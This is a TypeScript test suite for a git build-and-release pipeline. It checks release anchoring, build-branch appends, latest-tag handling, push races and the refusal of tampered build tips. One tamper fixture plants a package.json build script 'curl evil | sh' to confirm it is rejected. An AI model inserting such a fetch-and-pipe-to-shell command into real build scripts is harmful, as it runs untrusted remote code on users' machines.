          "last-release-sha": fx.mergeSha,
          packages: { ".": { "release-type": "simple", draft: true } },
        },
        null,
        2,
      )}\n`,
    );
    commitAll(dir, "chore: align the fixture boundary");
    // Newer than the release merge and sharing its prefix, but not its shape: must neither become the boundary nor park the check.
    write(dir, "src/marker.ts", "export const marker = 7;\n");
    commitAll(dir, "chore(main): release pipeline documentation");
    expect(boundaryCheck(dir).boundary).toBe(fx.mergeSha);
  });
});

describe("anchorCheck", () => {
  test("a release PR whose anchor is missing is unmergeable", () => {
    const fx = seedFixture();
    createReleasePrBranch(fx, fx.mergeSha, "2.2.0");
    const pr = clone(fx.root, fx.origin, "anchor-check-missing");
    git(pr, "checkout", "--quiet", "release-please--branches--main");
    expect(() => anchorCheck(pr)).toThrow(/anchor is missing or stale/);
  });

  test("an anchored release PR passes", () => {
    const fx = seedFixture();
    createReleasePrBranch(fx, fx.mergeSha, "2.2.0");
    const worker = clone(fx.root, fx.origin, "anchor-check-worker");
    expect(anchorReleasePr({ cwd: worker, sourceSha: fx.mergeSha }).changed).toBe(true);
    const pr = clone(fx.root, fx.origin, "anchor-check-ok");
    git(pr, "checkout", "--quiet", "release-please--branches--main");
    expect(anchorCheck(pr).boundary).toBe(fx.mergeSha);
  });
});

describe("advanceBuild", () => {
  const advanced = (tip: string): string =>
    `refs/heads/build: advanced to ${tip}; refs/tags/latest: moved to ${tip}`;

  test("the first advance creates build as the green commit's packaged commit, a root, and tags it latest; a rerun verifies both", () => {
    const fx = seedFixture();
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({
        cwd: fx.work,
        sourceSha: fx.mergeSha,
        runUrl: "https://example.invalid/actions/runs/7",
      });
    });
    const tip = buildTip(fx);
    expect(result).toEqual({ changed: true, buildSha: tip, latestSha: tip, reason: advanced(tip) });
    expect(pushes).toEqual([appendOf(tip), latestOf("", tip)]);
    expect(latestTag(fx)).toBe(tip);
    expect(parentOf(fx.origin, tip)).toBe("");
    expect(git(fx.origin, "diff", "--name-only", fx.mergeSha, tip)).toBe(PACKAGED_DIFF);
    expect(git(fx.origin, "show", `${tip}:lib/index.js`)).toBe("packaged-bundle-bytes-1");
    expect(git(fx.origin, "show", `${tip}:lib/pkg/index.js`)).toBe(
      "library-packaged-bundle-bytes-1",
    );
    expect(git(fx.origin, "show", `${tip}:lib/pkg/index.d.ts`)).toBe(
      "types-packaged-bundle-bytes-1",
    );
    const body = git(fx.origin, "log", "-1", "--format=%B", tip);
    expect(body).toContain(`build: main at ${git(fx.origin, "rev-parse", "--short", fx.mergeSha)}`);
    expect(body).toContain("Workflow-run: https://example.invalid/actions/runs/7");
    expect(sourceTrailer(fx.origin, tip)).toBe(fx.mergeSha);
    expect(identityOf(fx.origin, tip)).toBe(BOT_IDENTITY);
    expect(localIdentity(fx.work)).toBe(FIXTURE_IDENTITY);
    expect(git(fx.work, "rev-parse", "HEAD")).toBe(fx.mergeSha);
    expect(git(fx.work, "status", "--porcelain")).toBe("");

    const rerun = checkoutOf(fx, "build-rerun", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let again: ReturnType<typeof advanceBuild> | undefined;
    const rerunPushes = withPushPlans(fx, [], () => {
      again = advanceBuild({ cwd: rerun, sourceSha: fx.mergeSha });
    });
    expect(again).toEqual({
      changed: false,
      buildSha: tip,
      latestSha: tip,
      reason: `refs/heads/build already packages ${fx.mergeSha} at ${tip}; refs/tags/latest already at ${tip}`,
    });
    expect(rerunPushes).toEqual([]);
    expect(buildTip(fx)).toBe(tip);
    expect(latestTag(fx)).toBe(tip);
  });

  test("a newer green commit appends a fast-forward child of the previous tip and latest follows", () => {
    const fx = seedFixture();
    const first = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    // The stale checkout is cloned BEFORE the newer commit exists: it must learn that commit from origin to see build as already past.
    const stale = checkoutOf(fx, "build-stale", fx.mergeSha, "packaged-bundle-bytes-1\n");
    const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
    let second: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      second = advanceBuild({ cwd: next.dir, sourceSha: next.sha });
    });
    const tip = buildTip(fx);
    expect(second).toEqual({ changed: true, buildSha: tip, latestSha: tip, reason: advanced(tip) });
    expect(pushes).toEqual([appendOf(tip), latestOf(first, tip)]);
    expect(latestTag(fx)).toBe(tip);
    expect(git(fx.origin, "rev-parse", `${tip}^`)).toBe(first);
    expect(git(fx.origin, "diff", "--name-only", next.sha, tip)).toBe(PACKAGED_DIFF);
    expect(git(fx.origin, "show", `${tip}:lib/index.js`)).toBe("packaged-bundle-bytes-2");
    expect(git(fx.origin, "show", `${tip}:src/marker.ts`)).toBe(
      'export const marker = "second-green";',
    );
    expect(sourceTrailer(fx.origin, tip)).toBe(next.sha);

    let staleResult: ReturnType<typeof advanceBuild> | undefined;
    const stalePushes = withPushPlans(fx, [], () => {
      staleResult = advanceBuild({ cwd: stale, sourceSha: fx.mergeSha });
    });
    expect(staleResult).toEqual({
      changed: false,
      buildSha: first,
      latestSha: tip,
      reason: `refs/heads/build already packages ${fx.mergeSha} at ${first}; refs/tags/latest already at ${tip}`,
    });
    expect(stalePushes).toEqual([]);
    expect(buildTip(fx)).toBe(tip);
    expect(latestTag(fx)).toBe(tip);
  });

  test("a chain commit carries the source without its workflows, and a workflow change between two appends pushes cleanly", () => {
    const fx = seedFixture();
    const first = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    const paths = treePaths(fx.origin, first);
    expect(paths.filter((path) => path.startsWith(".github/workflows/"))).toEqual([]);
    expect(paths).toContain(".github/dependabot.yml");
    expect(paths).toContain("lib/index.js");
    expect(paths).toContain("lib/pkg/index.js");
    // GitHub judges a token's workflow-push refusal per push, so a workflow change between two appends is the shape the fixture can pin: the chain
    // commit carries neither workflow.
    const dir = clone(fx.root, fx.origin, "workflow-change");
    write(dir, ".github/workflows/ci.yml", "name: ci\non: [push, pull_request]\njobs: {}\n");
    write(dir, ".github/workflows/nightly.yml", "name: nightly\non: schedule\njobs: {}\n");
    const sha = commitAll(dir, "ci: change the workflows");
    git(dir, "push", "--quiet", "origin", "HEAD:refs/heads/main");
    writeBuild(dir, "packaged-bundle-bytes-2\n");
    const second = advanceBuild({ cwd: dir, sourceSha: sha });
    expect(second.changed).toBe(true);
    expect(parentOf(fx.origin, second.buildSha)).toBe(first);
    expect(
      treePaths(fx.origin, second.buildSha).filter((path) => path.startsWith(".github/workflows/")),
    ).toEqual([]);
    expect(git(fx.origin, "diff", "--name-only", sha, second.buildSha)).toBe(
      ".github/workflows/ci.yml\n.github/workflows/nightly.yml\nlib/index.js\nlib/pkg/index.d.ts\nlib/pkg/index.js\npackage.json",
    );
  });

  test("a stale rerun of a commit build skipped finds build already past it and appends nothing", () => {
    const fx = seedFixture();
    advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
    const skipped = pushGreenCommit(fx, "skipped-green", "packaged-bundle-bytes-2\n");
    const third = pushGreenCommit(fx, "third-green", "packaged-bundle-bytes-3\n");
    const tip = advanceBuild({ cwd: third.dir, sourceSha: third.sha }).buildSha;
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({ cwd: skipped.dir, sourceSha: skipped.sha });
    });
    expect(result).toEqual({
      changed: false,
      buildSha: tip,
      latestSha: tip,
      reason: `refs/heads/build is already past ${skipped.sha} (built from ${third.sha}); the newer run advanced it; refs/tags/latest already at ${tip}`,
    });
    expect(pushes).toEqual([]);
    expect(buildTip(fx)).toBe(tip);
  });

  function plantLatest(
    fx: Fixture,
    name: string,
    source: string,
    parent: string,
    files: Record<string, string>,
  ): string {
    const planter = clone(fx.root, fx.origin, name);
    git(planter, "checkout", "--quiet", source);
    stripWorkflows(planter);
    writeBuild(planter, "planted\n");
    stageBuild(planter);
    for (const [file, content] of Object.entries(files)) {
      write(planter, file, content);
      git(planter, "add", "-f", file);
    }
    const planted = git(
      planter,
      "commit-tree",
      git(planter, "write-tree"),
      "-p",
      parent,
      "-m",
      "build: by hand",
      "-m",
      `Source: ${source}`,
    );
    git(planter, "push", "--quiet", "--force", "origin", `${planted}:refs/tags/latest`);
    return planted;
  }

  const plantedNewer: [string, (fx: Fixture, tip: string, newer: string) => string][] = [
    [
      "a tampered tree",
      (fx, tip, newer) =>
        plantLatest(fx, "latest-newer-tampered", newer, tip, {
          "action.yml": "name: tampered\n",
        }),
    ],
    [
      "a pure package that is not on build",
      (fx, _tip, newer) => plantLatest(fx, "latest-newer-detached", newer, newer, {}),
    ],
  ];
  test.each(plantedNewer)(
    "a hand-planted latest naming a newer source with %s is replaced by this run's target",
    (_name, plant) => {
      const fx = seedFixture();
      const tip = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
      // The newer main commit is not packaged yet, so its Source trailer alone would read as "newer, leave it".
      const newer = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
      const planted = plant(fx, tip, newer.sha);
      expect(latestTag(fx)).toBe(planted);
      const rerun = checkoutOf(fx, "latest-rerun", fx.mergeSha, "packaged-bundle-bytes-1\n");
      let result: ReturnType<typeof advanceBuild> | undefined;
      const pushes = withPushPlans(fx, [], () => {
        result = advanceBuild({ cwd: rerun, sourceSha: fx.mergeSha });
      });
      expect(result).toEqual({
        changed: false,
        buildSha: tip,
        latestSha: tip,
        reason: `refs/heads/build already packages ${fx.mergeSha} at ${tip}; refs/tags/latest: moved to ${tip}`,
      });
      expect(pushes).toEqual([latestOf(planted, tip)]);
      expect(latestTag(fx)).toBe(tip);
    },
  );

  test("a latest fifty-one chain commits behind the tip is left alone", () => {
    const fx = seedFixture();
    const kept = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    // Rolling latest back to the older tip would be wrong however long the backfill chain.
    const filler = clone(fx.root, fx.origin, "latest-filler");
    git(filler, "checkout", "--quiet", fx.seedSha);
    stripWorkflows(filler);
    writeBuild(filler, "packaged-bundle-bytes-0\n");
    stageBuild(filler);
    stripPrepare(filler);
    const tree = git(filler, "write-tree");
    let tip = kept;
    for (let n = 0; n < 51; n++) {
      tip = git(
        filler,
        "commit-tree",
        tree,
        "-p",
        tip,
        "-m",
        `build: backfill ${n}`,
        "-m",
        `Source: ${fx.seedSha}`,
      );
    }
    git(filler, "push", "--quiet", "origin", `${tip}:refs/heads/build`);
    const rerun = checkoutOf(fx, "latest-deep", fx.seedSha, "packaged-bundle-bytes-0\n");
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({ cwd: rerun, sourceSha: fx.seedSha });
    });
    expect(result).toEqual({
      changed: false,
      buildSha: tip,
      latestSha: kept,
      reason: `refs/heads/build already packages ${fx.seedSha} at ${tip}; refs/tags/latest stays at ${kept} (built from ${fx.mergeSha}), newer than ${tip} (built from ${fx.seedSha}); the next green push appends past it`,
    });
    expect(pushes).toEqual([]);
    expect(latestTag(fx)).toBe(kept);
  });

  test("an annotated latest on a valid newer chain commit is left alone by a stale rerun", () => {
    const fx = seedFixture();
    advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
    const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
    const newer = advanceBuild({ cwd: next.dir, sourceSha: next.sha }).buildSha;
    // latest is re-made by hand as an ANNOTATED tag (its id is a tag object) at the newer commit.
    const backfill = rivalChainCommit(
      fx,
      "seed-backfill",
      fx.seedSha,
      newer,
      "packaged-bundle-bytes-0\n",
    );
    git(backfill.from, "push", "--quiet", "origin", `${backfill.sha}:refs/heads/build`);
    git(backfill.from, "tag", "-a", "-f", "-m", "by hand", "latest", newer);
    git(backfill.from, "push", "--quiet", "--force", "origin", "refs/tags/latest");
    const tagObject = git(fx.origin, "rev-parse", "refs/tags/latest");
    expect(tagObject).not.toBe(newer);
    expect(latestTag(fx)).toBe(newer);
    const rerun = checkoutOf(fx, "seed-rerun", fx.seedSha, "packaged-bundle-bytes-0\n");
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({ cwd: rerun, sourceSha: fx.seedSha });
    });
    expect(result).toEqual({
      changed: false,
      buildSha: backfill.sha,
      latestSha: newer,
      reason: `refs/heads/build already packages ${fx.seedSha} at ${backfill.sha}; refs/tags/latest stays at ${newer} (built from ${next.sha}), newer than ${backfill.sha} (built from ${fx.seedSha}); the next green push appends past it`,
    });
    expect(pushes).toEqual([]);
    expect(git(fx.origin, "rev-parse", "refs/tags/latest")).toBe(tagObject);
  });

  test("a hand-moved latest is brought back to the tip by the next run", () => {
    const fx = seedFixture();
    const tip = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    git(fx.work, "push", "--quiet", "--force", "origin", `${fx.seedSha}:refs/tags/latest`);
    const rerun = checkoutOf(fx, "latest-heal", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({ cwd: rerun, sourceSha: fx.mergeSha });
    });
    expect(result).toEqual({
      changed: false,
      buildSha: tip,
      latestSha: tip,
      reason: `refs/heads/build already packages ${fx.mergeSha} at ${tip}; refs/tags/latest: moved to ${tip}`,
    });
    expect(pushes).toEqual([latestOf(fx.seedSha, tip)]);
    expect(latestTag(fx)).toBe(tip);
  });

  function plantBuild(
    fx: Fixture,
    name: string,
    from: string,
    message: string[],
    files: Record<string, string | { linkTo: string }> = builtFiles("planted\n"),
  ): string {
    const planter = clone(fx.root, fx.origin, name);
    git(planter, "checkout", "--quiet", from);
    stripWorkflows(planter);
    for (const [file, content] of Object.entries(files)) {
      if (typeof content === "string") {
        write(planter, file, content);
      } else {
        mkdirSync(dirname(join(planter, file)), { recursive: true });
        symlinkSync(content.linkTo, join(planter, file));
      }
      git(planter, "add", "-f", file);
    }
    const paragraphs = message.flatMap((paragraph) => ["-m", paragraph]);
    git(planter, "commit", "--quiet", "--allow-empty", ...paragraphs);
    git(planter, "push", "--quiet", "--force", "origin", "HEAD:refs/heads/build");
    return git(planter, "rev-parse", "HEAD");
  }

  function plantForeignBuild(fx: Fixture, from: string): { sideSha: string; planted: string } {
    const side = clone(fx.root, fx.origin, "build-side");
    git(side, "checkout", "--quiet", "-b", "side", from);
    write(side, "src/marker.ts", "export const marker = 'side';\n");
    const sideSha = commitAll(side, "feat: never merged");
    git(side, "push", "--quiet", "origin", "HEAD:refs/heads/side");
    const planted = plantBuild(fx, "build-foreign", sideSha, [
      "build: by hand",
      `Source: ${sideSha}`,
    ]);
    return { sideSha, planted };
  }

  const byHand =
    "refusing to build on a build branch this pipeline did not mint - inspect it by hand.";
  const foreign = (tip: string, source: string): string =>
    `refs/heads/build is at ${tip}, built from ${source}, which is not on main's history; refusing to append to a build branch this pipeline did not advance - inspect it by hand.`;

  function rebuiltTree(fx: Fixture, name: string, source: string): string {
    const rebuild = clone(fx.root, fx.origin, name);
    git(rebuild, "checkout", "--quiet", source);
    stripWorkflows(rebuild);
    writeBuild(rebuild, "planted\n");
    stageBuild(rebuild);
    stripPrepare(rebuild);
    return git(rebuild, "write-tree");
  }

  function notAPackage(
    fx: Fixture,
    where: "is at" | "holds",
    planted: string,
    source: string,
    changed: string,
  ): Error {
    const actual = git(fx.origin, "rev-parse", `${planted}^{tree}`);
    const expected = rebuiltTree(fx, `rebuilt-${planted.slice(0, 8)}`, source);
    return new Error(
      `refs/heads/build ${where} ${planted}, which names ${source} as its source but is not ` +
        `${source} plus lib/index.js and lib/pkg/, minus package.json's prepare script, and the removal of .github/workflows/ alone: its tree is ` +
        `${actual}, the rebuilt one is ${expected} (paths beyond those changed relative to ` +
        `${source}: ${changed}); ${byHand}`,
    );
  }

  /** A tip with an EMPTY subtree at `empty/`, which a path diff cannot list. */
  function plantEmptySubtreeBuild(fx: Fixture, from: string): string {
    const planter = clone(fx.root, fx.origin, "build-empty-subtree");
    git(planter, "checkout", "--quiet", from);
    stripWorkflows(planter);
    writeBuild(planter, "planted\n");
    stageBuild(planter);
    const emptyTree = execFileSync("git", ["hash-object", "-w", "-t", "tree", "--stdin"], {
      cwd: planter,
      input: "",
      encoding: "utf8",
    }).trim();
    const entries = `${git(planter, "ls-tree", git(planter, "write-tree"))}\n040000 tree ${emptyTree}\tempty\n`;
    const tree = execFileSync("git", ["mktree"], {
      cwd: planter,
      input: entries,
      encoding: "utf8",
    }).trim();
    const planted = git(
      planter,
      "commit-tree",
      tree,
      "-p",
      from,
      "-m",
      "build: by hand",
      "-m",
      `Source: ${from}`,
    );
    git(planter, "push", "--quiet", "--force", "origin", `${planted}:refs/heads/build`);
    return planted;
  }

  /** Plants a build tip the advance from fx.work (at the merge commit) must refuse; returns the tip and the exact or matching error. */
  type Refusal = (fx: Fixture) => { planted: string; error: RegExp | Error };
  const refused: [string, Refusal][] = [
    [
      "built from a commit off main's history that this checkout knows",
      (fx) => {
        const { sideSha, planted } = plantForeignBuild(fx, fx.seedSha);
        // Known locally, so the verdict is merge-base's, not the unknown-sha screen.
        git(fx.work, "fetch", "--quiet", "origin", "refs/heads/side");
        return { planted, error: new Error(foreign(planted, sideSha)) };
      },
    ],
    [
      "built from a commit this checkout has never seen",
      (fx) => {
        const { sideSha, planted } = plantForeignBuild(fx, fx.seedSha);
        return { planted, error: new Error(foreign(planted, sideSha)) };
      },
    ],
    [
      "built from a descendant of this commit that never reached main",
      (fx) => {
        // Descends from main's head, so ancestry alone would read it as a newer run's work; only its absence from main tells it apart.
        const { sideSha, planted } = plantForeignBuild(fx, fx.mergeSha);
        git(fx.work, "fetch", "--quiet", "origin", "refs/heads/side");
        return { planted, error: new Error(foreign(planted, sideSha)) };
      },
    ],
    [
      "carrying no Source trailer",
      (fx) => {
        const planted = plantBuild(fx, "build-untrailed", fx.mergeSha, ["build: by hand"]);
        return {
          planted,
          error: new Error(
            `refs/heads/build is at ${planted}, which carries no Source trailer, so this pipeline did not mint it; ${byHand}`,
          ),
        };
      },
    ],
    [
      "naming this source but changing more than the build outputs",
      (fx) => {
        const planted = plantBuild(
          fx,
          "build-extra",
          fx.mergeSha,
          ["build: by hand", `Source: ${fx.mergeSha}`],
          { ...builtFiles("planted\n"), "src/marker.ts": "export const marker = 666;\n" },
        );
        return { planted, error: notAPackage(fx, "holds", planted, fx.mergeSha, "src/marker.ts") };
      },
    ],
    [
      "naming this source with build outputs that are not this checkout's build",
      (fx) => {
        const genuine = checkoutOf(fx, "build-genuine", fx.mergeSha, "packaged-bundle-bytes-1\n");
        const built = advanceBuild({ cwd: genuine, sourceSha: fx.mergeSha }).buildSha;
        const tree = git(fx.origin, "rev-parse", `${built}^{tree}`);
        const planted = plantBuild(fx, "build-rebuilt", fx.mergeSha, [
          "build: by hand",
          `Source: ${fx.mergeSha}`,
        ]);
        const plantedTree = git(fx.origin, "rev-parse", `${planted}^{tree}`);
        return {
          planted,
          error: new Error(
            `refs/heads/build holds ${planted}, which names ${fx.mergeSha} as its source but ` +
              `its tree ${plantedTree} is not the tree ${tree} this checkout's build of ` +
              `${fx.mergeSha} packages, so the two differ under lib/index.js and lib/pkg/ (bytes, ` +
              "file modes, or the files under lib/pkg/): either the commit was not built from this " +
              "source or the build is not reproducible, and the Source trailer cannot tell those " +
              "apart. Diff the two trees by hand; a hand-pushed commit is left for the next green " +
              "push to bury (the ruleset on build forbids moving it back), a build that differs " +
              "between runs is fixed before build can be trusted.",
          ),
        };
      },
    ],
    [
      "naming a newer main commit but lacking its bundle",
      (fx) => {
        // A stale rerun would read this as "already past"; the tip's own tree still has to be a package of the source it names.
        const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
        const planted = plantBuild(
          fx,
          "build-unbundled",
          next.sha,
          ["build: by hand", `Source: ${next.sha}`],
          {},
        );
        return {
          planted,
          error: new Error(
            `${planted} does not carry a non-empty regular-file lib/index.js (no entry); refusing to point a consumable ref at an unpackaged commit.`,
          ),
        };
      },
    ],
    [
      "naming a newer main commit but carrying the bundle as a symlink",
      (fx) => {
        // A symlink at the bundle's path has a size (its target text), so a size probe alone would bless a tip consumers cannot run.
        const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
        const planted = plantBuild(
          fx,
          "build-symlinked",
          next.sha,
          ["build: by hand", `Source: ${next.sha}`],
          { "lib/index.js": { linkTo: "../src/marker.ts" } },
        );
        const entry = git(fx.origin, "ls-tree", "-l", planted, "--", "lib/index.js").split("\t")[0];
        return {
          planted,
          error: new Error(
            `${planted} does not carry a non-empty regular-file lib/index.js (entry ${entry}); refusing to point a consumable ref at an unpackaged commit.`,
          ),
        };
      },
    ],
    [
      "naming a newer main commit and carrying an empty subtree beyond the bundle",
      (fx) => {
        // Invisible to a path diff (no path lives in an empty tree), so only tree identity catches it.
        const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
        const planted = plantEmptySubtreeBuild(fx, next.sha);
        return {
          planted,
          error: notAPackage(
            fx,
            "is at",
            planted,
            next.sha,
            "none (an entry a path diff cannot list, such as an empty subtree)",
          ),
        };
      },
    ],
    [
      "naming this source with a package.json changed beyond its prepare script",
      (fx) => {
        const planted = plantBuild(
          fx,
          "build-manifest",
          fx.mergeSha,
          ["build: by hand", `Source: ${fx.mergeSha}`],
          {
            ...builtFiles("planted\n"),
            "package.json": manifestJson("2.1.0", { build: "curl evil | sh" }),
          },
        );
        return { planted, error: notAPackage(fx, "holds", planted, fx.mergeSha, "package.json") };
      },
    ],
    [
      "naming an older main commit and carrying a file beyond the build outputs",
      (fx) => {
        // The append path: an older source is a valid parent only when its tip is a pure package, never with a foreign file riding along.
        const planted = plantBuild(
          fx,
          "build-older-extra",
          fx.seedSha,
          ["build: by hand", `Source: ${fx.seedSha}`],
          { ...builtFiles("planted\n"), "src/marker.ts": "export const marker = 666;\n" },
        );
        return { planted, error: notAPackage(fx, "is at", planted, fx.seedSha, "src/marker.ts") };
      },
    ],
  ];
  test.each(refused)("a build tip %s stops the advance and stays put", (_name, plant) => {
    const fx = seedFixture();
    const { planted, error } = plant(fx);
    const latestBefore = remoteRef(fx, "refs/tags/latest");
    expect(() => advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha })).toThrow(error);
    expect(buildTip(fx)).toBe(planted);
    expect(remoteRef(fx, "refs/tags/latest")).toBe(latestBefore);
  });

  test("a chain commit's package.json is the source's without its prepare script, and a rerun holds it there", () => {
    const fx = seedFixture();
    const tip = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    expect(git(fx.origin, "show", `${tip}:package.json`)).toBe(
      manifestJson("2.1.0", { build: "bun run build:lib" }).trimEnd(),
    );
    expect(git(fx.origin, "show", `${fx.mergeSha}:package.json`)).toBe(
      manifestJson("2.1.0").trimEnd(),
    );
    const rerun = checkoutOf(fx, "manifest-rerun", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let again: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      again = advanceBuild({ cwd: rerun, sourceSha: fx.mergeSha });
    });
    expect(again).toEqual({
      changed: false,
      buildSha: tip,
      latestSha: tip,
      reason: `refs/heads/build already packages ${fx.mergeSha} at ${tip}; refs/tags/latest already at ${tip}`,
    });
    expect(pushes).toEqual([]);
    expect(buildTip(fx)).toBe(tip);
    expect(latestTag(fx)).toBe(tip);
  });

  test.each(["lib/index.js", "lib/pkg/index.js"])("an empty %s never reaches build", (file) => {
    const fx = seedFixture();
    write(fx.work, file, "");
    expect(() => advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha })).toThrow(
      `does not carry a non-empty regular-file ${file}`,
    );
    expect(remoteRef(fx, "refs/heads/build")).toBe("");
    expect(remoteRef(fx, "refs/tags/latest")).toBe("");
  });

  test("a build tip minted before the library rode along is built on, and the child carries it", () => {
    const fx = seedFixture();
    // The chain as the pipeline left it before lib/pkg/ was packaged: the
    // seed's tree minus workflows plus the bundle alone, latest on it.
    const legacy = plantBuild(
      fx,
      "build-legacy",
      fx.seedSha,
      ["build: by hand", `Source: ${fx.seedSha}`],
      {
        "lib/index.js": "packaged-bundle-bytes-0\n",
      },
    );
    git(fx.work, "fetch", "--quiet", "origin", "refs/heads/build");
    git(fx.work, "push", "--quiet", "--force", "origin", `${legacy}:refs/tags/latest`);
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
    });
    const tip = buildTip(fx);
    expect(result).toEqual({ changed: true, buildSha: tip, latestSha: tip, reason: advanced(tip) });
    expect(pushes).toEqual([appendOf(tip), latestOf(legacy, tip)]);
    expect(parentOf(fx.origin, tip)).toBe(legacy);
    expect(git(fx.origin, "diff", "--name-only", fx.mergeSha, tip)).toBe(PACKAGED_DIFF);
    // A stale rerun of the legacy source's run under this pipeline builds
    // lib/pkg/ the chain commit lacks: it stops rather than rewrite the chain.
    const stale = checkoutOf(fx, "legacy-rerun", fx.seedSha, "packaged-bundle-bytes-0\n");
    expect(() => advanceBuild({ cwd: stale, sourceSha: fx.seedSha })).toThrow(
      new RegExp(
        `refs/heads/build holds ${legacy}, which names ${fx.seedSha} as its source but its tree [0-9a-f]{40} is not the tree [0-9a-f]{40} this checkout's build of ${fx.seedSha} packages, so the two differ under lib/index.js and lib/pkg/`,
      ),
    );
    expect(buildTip(fx)).toBe(tip);
    expect(latestTag(fx)).toBe(tip);
  });

  test("a release tag on a chain commit without the library build fails the confirmation, whatever its bundle", () => {
    const fx = seedFixture();
    // A legacy-shaped chain commit for the merge commit: right source, right
    // bundle bytes, no lib/pkg/; build's tip, tagged as the release.
    const planted = plantBuild(
      fx,
      "build-legacy-release",
      fx.mergeSha,
      ["build: by hand", `Source: ${fx.mergeSha}`],
      {
        "lib/index.js": "packaged-bundle-bytes-1\n",
      },
    );
    git(fx.work, "fetch", "--quiet", "origin", "refs/heads/build");
    git(
      fx.work,
      "push",
      "--quiet",
      "origin",
      `${planted}:refs/tags/v2.1.0`,
      `${planted}:refs/tags/v2`,
    );
    expect(() =>
      verifyPublishedRefs({
        cwd: shallowChecker(fx, "verify-legacy"),
        tag: "v2.1.0",
        sourceSha: fx.mergeSha,
      }),
    ).toThrow(
      `${planted} does not carry a non-empty regular-file lib/pkg/index.js (no entry); refusing to point a consumable ref at an unpackaged commit.`,
    );
    // The package rerun holds the tag to this checkout's whole build too.
    expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      /carries \[lib\/index\.js\] under lib\/index\.js and lib\/pkg\/, while this build of [0-9a-f]{40} produced \[lib\/index\.js, lib\/pkg\/index\.d\.ts, lib\/pkg\/index\.js\]/,
    );
  });

  test("a shallow checkout is refused before any verdict", () => {
    const fx = seedFixture();
    const dir = join(fx.root, "build-shallow");
    execFileSync("git", ["clone", "--quiet", "--depth", "1", `file://${fx.origin}`, dir]);
    writeBuild(dir, "packaged-bundle-bytes-1\n");
    expect(() => advanceBuild({ cwd: dir, sourceSha: fx.mergeSha })).toThrow(
      /needs the full history.*shallow/,
    );
    expect(remoteRef(fx, "refs/heads/build")).toBe("");
  });

  /** `count` packaged commits of the seed chained from a root, unpushed: the plans land one ahead of each of this run's pushes. */
  function competitors(
    fx: Fixture,
    count: number,
  ): { from: string; plans: PushPlan[]; shas: string[]; first: string; last: string } {
    const from = clone(fx.root, fx.origin, "build-competitor");
    git(from, "checkout", "--quiet", fx.seedSha);
    stripWorkflows(from);
    writeBuild(from, "competitor-bundle\n");
    stageBuild(from);
    stripPrepare(from);
    const tree = git(from, "write-tree");
    const shas: string[] = [];
    let first = "";
    let last = "";
    for (let n = 1; n <= count; n++) {
      last = git(
        from,
        "commit-tree",
        tree,
        ...(last === "" ? [] : ["-p", last]),
        "-m",
        `build: competitor ${n}`,
        "-m",
        `Source: ${fx.seedSha}`,
      );
      first = first === "" ? last : first;
      shas.push(last);
    }
    return {
      from,
      plans: shas.map((sha) => ({ competitor: { from, sha, ref: "refs/heads/build" } })),
      shas,
      first,
      last,
    };
  }

  function expectRetriedOnto(
    fx: Fixture,
    before: string,
    rivalTip: string,
    result: ReturnType<typeof advanceBuild> | undefined,
    pushes: string[][],
  ): void {
    const tip = buildTip(fx);
    expect(result).toEqual({ changed: true, buildSha: tip, latestSha: tip, reason: advanced(tip) });
    expect(latestTag(fx)).toBe(tip);
    expect(git(fx.origin, "rev-parse", `${tip}^`)).toBe(rivalTip);
    expect(sourceTrailer(fx.origin, tip)).toBe(fx.mergeSha);
    const rejected = appendedSha(pushes[0] ?? []);
    expect(pushes).toEqual([appendOf(rejected), appendOf(tip), latestOf("", tip)]);
    expect(parentOf(fx.work, rejected)).toBe(before);
  }

  test("a push overtaken by another run is retried on the new tip", () => {
    const fx = seedFixture();
    const rival = competitors(fx, 1);
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, rival.plans, () => {
      result = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
    });
    expectRetriedOnto(fx, "", rival.first, result, pushes);
  });

  // The rival lands DURING the push: origin's update hook moves build after receive-pack advertised it, so the update fails its own compare-and-set.
  // git words that differently for a ref created since ("reference already exists") and one moved since ("is at ... but expected").
  const raced: [string, boolean][] = [
    ["created", false],
    ["moved", true],
  ];
  test.each(raced)(
    "a push whose ref the server finds %s since advertising it is retried",
    (_name, preexisting) => {
      const fx = seedFixture();
      const rival = competitors(fx, preexisting ? 2 : 1);
      git(rival.from, "push", "--quiet", "origin", `${rival.last}:refs/heads/rival`);
